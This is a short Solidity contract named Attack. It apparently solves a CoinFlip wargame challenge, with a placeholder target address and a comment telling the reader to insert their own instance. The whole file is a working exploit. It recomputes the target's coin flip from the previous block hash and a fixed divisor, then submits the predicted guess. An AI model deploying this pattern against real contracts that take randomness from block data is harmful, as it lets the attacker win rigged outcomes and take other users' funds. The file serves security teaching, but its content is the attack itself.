pragma solidity ^0.4.18;
contract Attack {
  CoinFlip cf;
  // replace target by your instance address
  address target = 0x1111111111111111111111111111111111111111;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function Attack() public {
    cf = CoinFlip(target);
  }

  function calc() public view returns (bool){
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    return coinFlip == 1 ? true : false;
  }

  function flip() public {
    bool guess = calc();
    cf.flip(guess);
  }
}